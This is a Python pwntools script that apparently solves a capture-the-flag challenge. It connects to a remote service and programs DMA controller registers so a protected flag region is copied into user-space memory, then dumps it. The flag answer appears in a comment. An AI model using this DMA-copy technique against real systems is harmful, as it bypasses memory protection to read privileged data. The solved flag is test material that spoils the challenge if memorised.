from pwn import *
import time

def solve():
    io = remote('51.11.228.103', 1337)
    time.sleep(1)
    io.clean()
    
    def run_cmd(cmd):
        io.sendline(cmd.encode())
        time.sleep(1)
        res = io.clean()
        return res.decode()

    # Configuring DMA to copy flag from /root/flag.txt (at 0x0200) 
    # to User Space (at 0x1000)
    run_cmd("write_mem 0x4018 0x0200") # SA (Source Address)
    run_cmd("write_mem 0x4020 0x1000") # DA (Destination Address)
    run_cmd("write_mem 0x4028 0x0040") # BTT (Bytes To Transfer) - triggers transfer
    
    time.sleep(2) # Wait for DMA to complete
    
    # Dump the flag from the accessible User Space
    output = run_cmd("hexdump 0x1000 0x40")
    print(output)

    # Extract flag
    # THC{DMA-1s_n0t_5tr0ng_en0ugh?}
    
    io.close()

if __name__ == "__main__":
    solve()
